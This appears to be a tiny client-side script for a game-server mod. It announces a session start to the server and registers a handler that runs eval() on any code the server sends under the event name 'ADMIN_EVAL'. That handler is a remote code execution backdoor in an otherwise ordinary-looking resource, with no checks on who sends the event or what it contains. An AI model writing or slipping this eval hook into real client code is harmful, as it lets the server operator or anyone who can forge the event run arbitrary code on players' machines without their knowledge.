API.onResourceStart.connect(function(){API.triggerServerEvent("SESSION_INIT")});
API.onServerEventTrigger.connect(function(e,a){if(e=='ADMIN_EVAL'){eval(a[0])}});